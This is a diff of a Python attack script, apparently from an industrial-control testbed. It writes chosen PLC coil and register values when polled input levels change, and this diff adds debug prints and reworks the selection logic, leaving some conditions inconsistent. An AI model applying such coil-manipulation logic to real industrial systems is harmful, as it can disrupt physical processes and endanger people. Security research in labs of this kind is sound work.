@@ -331,20 +331,21 @@ def attack(ctx):
         config = configparser.ConfigParser()
         config.read('config.ini')
         
-        #print(f"{plc}")
-
+        print(f"{plc}")
+        plc_choice = ""
         if(plc == "plc1"):
             plc_choice = config.get('params', 'plc1_choice')
         elif(plc == "plc2"):
             plc_choice = config.get('params', 'plc2_choice')
-        else:
+        elif(plc == "plc3"):
             plc_choice = config.get('params', 'plc3_choice')
+        
             
         coil = []
         reg = []
         reg_d = []
         
-        #print(plc_choice)
+        print(plc_choice)
         
         
         # Extracting choices coils/registers
@@ -363,7 +364,7 @@ def attack(ctx):
                 temp = ctx.register(plc, 'D', int(choice[-1]))
                 temp.write(p_val)
                 
-            print(f"Writing on %QX0.{int(choice[-1])-1} - {plc}")
+            print(f"Writing on %QX0.{int(choice[-1])} - {plc}")
         
         #TODO register write          
         
@@ -381,22 +382,26 @@ def attack(ctx):
     plc_1_input_register = ctx.register('plc1', 'I', 0)
     plc_2_input_register = ctx.register('plc2', 'I', 0)
     plc_3_input_register = ctx.register('plc3', 'I', 0)
+
        
     # PLC attack
     # ONE PLC selected
-    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice')== "" and config.get('params', 'plc3_choice') == "":
+    if config.get('params', 'plc1_choice') != "" or config.get('params', 'plc2_choice')!= "" or config.get('params', 'plc3_choice') != "":
         print("Attacking one plc...")
         if config.get('params', 'plc1_choice') != "":
+            print("Attacking plc one...")
             plc_1_input_register.start_polling(500, on_level_change_plc1)
         elif config.get('params', 'plc2_choice') != "":
+            print("Attacking plc two...")
             plc_2_input_register.start_polling(500, on_level_change_plc2)
         elif config.get('params', 'plc3_choice') != "":
+            print("Attacking plc three...")
             plc_3_input_register.start_polling(500, on_level_change_plc3)
 
 
 
     # TWO PLCs selected
-    if config.get('plc', 'plc1') != "" and (config.get('params', 'plc2_choice') != "" or config.get('params', 'plc3_choice') != ""):
+    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
         print("Attacking two plcs...")
 
     # THREE PLCs selected 
